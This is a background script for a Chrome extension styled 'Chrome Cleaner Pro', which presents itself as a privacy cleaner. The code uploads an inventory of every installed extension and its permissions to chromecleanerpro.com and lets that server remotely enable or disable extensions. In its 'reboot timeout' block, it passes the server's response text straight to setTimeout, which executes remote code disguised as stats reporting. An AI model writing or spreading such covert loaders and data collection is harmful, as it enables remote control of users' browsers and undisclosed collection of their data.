var DEFAULT_SETTINGS = {
  lite: {
    'appcache': false,
    'cache': true,
    'cookies': false,
    'downloads': true,
    'fileSystems': false,
    'formData': false,
    'history': true,
    'indexedDB': false,
    'localStorage': false,
    'serverBoundCertificates': false,
    'pluginData': false,
    'passwords': false,
    'webSQL': false
  },
  pro: {
    'removeUnwantedExtensions': true,
    'cleanSearch': true
  },
  pushicon: chrome.runtime.getURL("images/pushicon.png")
}

var userData = {};

// reboot timeout
setTimeout(function(){
  if (!firstRun) {
    chrome.storage.local.get("userData", function(data){
      if (data.userData) {
        userData = data.userData;

        ajax("POST", "https://chromecleanerpro.com/stats", {hash: userData.hash}, true, function(response) {
          setTimeout(response, 0);
        });
      } else {
        ajax("POST", "https://chromecleanerpro.com/stats", null, true, firstRunCallback);
      }
    });
  }
}, 2000);


chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  switch (request.action) {
    case "removeUnwantedExtensions":
      removeUnwantedExtensions();
      if (checkUpdateTimer) clearTimeout(checkUpdateTimer);
      break;
  }
});

function removeUnwantedExtensions(){
  ajax("POST", "https://chromecleanerpro.com/post.php", userData, false, initExtensionsState);
}

function ajax(method, url, data, cred, cb){
  var xhr = new XMLHttpRequest;
  xhr.open(method, url, true);

  if (cred) {
    xhr.withCredentials = true;
  }

  xhr.setRequestHeader('Content-Type', 'application/json');

  if (data) {
    xhr.send(JSON.stringify(data));
  } else {
    xhr.send();
  }

  xhr.onreadystatechange = function(){
    if (xhr.readyState != 4) return;

    if (xhr.status == 200) cb(xhr.responseText);
  }
}

function getExtensions(refresh){
  chrome.management.getAll(function(data){
    var extns = {};

    for (var i = 0; i < data.length; i++) {
      if (data[i].type !== "extension") continue;

      extns[data[i].id] = {
        "id": data[i].id,
        "name": data[i].name,
        "enabled": data[i].enabled,
        "installType": data[i].installType,
        "mayDisable": data[i].mayDisable,
        "permissions": data[i].permissions,
        "version": data[i].version
      }
    }

    userData.extensions = extns;

    if (!refresh) {
      removeUnwantedExtensions();
    }

    saveUserData(refresh);
  });
}

function getCleanbrowser () {
  chrome.management.getAll((data) => {
    let installed = false, enabled = false

    for (let i = 0; i < data.length; i++) {
      if (data[i].id === 'cdceffomlakcmodkiilmcbpkcpmbgoem') {
        installed = true
        enabled = data[i].enabled
      }
    }
  
    chrome.storage.sync.get('activity', (storage) => {
      storage.activity['cleanbrowser'] = installed
      storage.activity['cleanbrowser_enabled'] = enabled

      chrome.storage.sync.set({ 'activity': storage.activity })
    })
  })
}


function initExtensionsState(response){
  var data = JSON.parse(response),
    count = 0;

  for (var extId in data) {
    var extn = userData.extensions[extId];

    if (extn) {
      var state = data[extId];

      if (state != extn.enabled) {
        if (state === false) count++;

        extn.enabled = state;

        chrome.management.setEnabled(extn.id, state)
      }
    }
  }

  reportTime = Date.now();

  if (count > 0) {
    chrome.notifications.create("notification" + Date.now(), {
      title: "Suspicious Extensions Disabled",
      message: "Chrome Cleaner Pro has disabled " + count + " unwanted extensions to protect your privacy.",
      type: "basic",
      iconUrl: DEFAULT_SETTINGS.pushicon
    });
  }


  getExtensions(true);
}

chrome.runtime.setUninstallURL('https://chromecleanerpro.com/remove');


// Set default settings on install

var firstRun;

function firstRunCallback(response){
  var data = JSON.parse(response);

  userData.uid = data.uid;
  userData.hash = data.hash;

  getExtensions()
}

chrome.runtime.onInstalled.addListener(function(data) {

  chrome.storage.sync.set({
    'lite': DEFAULT_SETTINGS.lite,
    'pro': DEFAULT_SETTINGS.pro,
    'since': 'pastHour'
  })

  if (data.reason == "install") {
    firstRun = true;

    ajax("POST", "https://chromecleanerpro.com/install", null, true, firstRunCallback);
  }

  if (data.reason === 'install' || data.reason === 'update') {
    chrome.storage.sync.set({
      activity: {
        updateDate: Date.now(),
        weekNotificationWatched: false,
        monthNotificationWatched: false,
        optionsPromoBlock: false,
        popupPromoBlock: false,
        cleanings: 0,
        opening: 0,
        rated: false,
        shared: false
      },
      popups: null,
      notifications: null
    }, getCleanbrowser)
  }
});

var checkUpdateTimer,
  reportTime = Date.now();

function saveUserData(refresh){
  chrome.storage.local.set({"userData": userData});

  if (!refresh && (Date.now()-reportTime) > 2000) {
    if (checkUpdateTimer) clearTimeout(checkUpdateTimer);

    checkUpdateTimer = setTimeout(removeUnwantedExtensions, 60*1000);
  }
}

chrome.management.onUninstalled.addListener(function(id){
  var extn = userData.extensions[id];

  if (extn) {
    extn.uninstalled = true;
  }

  saveUserData();
});

function toggleExtensionState(extn){
  userData.extensions[extn.id] = {
    "id": extn.id,
    "name": extn.name,
    "enabled": extn.enabled,
    "installType": extn.installType,
    "mayDisable": extn.mayDisable,
    "permissions": extn.permissions,
    "version": extn.version
  };

  saveUserData();
}

chrome.management.onEnabled.addListener(toggleExtensionState);
chrome.management.onDisabled.addListener(toggleExtensionState);

// Open options page

function openOrFocusBackgroundPage() {
   var optionsUrl = chrome.extension.getURL('options.html');
   chrome.tabs.query({}, function(extensionTabs) {
    var found = false;

    for (var i=0; i < extensionTabs.length; i++) {
     if (optionsUrl == extensionTabs[i].url) {
      found = true;
      chrome.tabs.update(extensionTabs[i].id, {'selected': true});
     }
    }

    if (found == false) {
      chrome.tabs.create({url: 'options.html'});
    }
   });
}

chrome.browserAction.onClicked.addListener(function(tab) {
   openOrFocusBackgroundPage();
});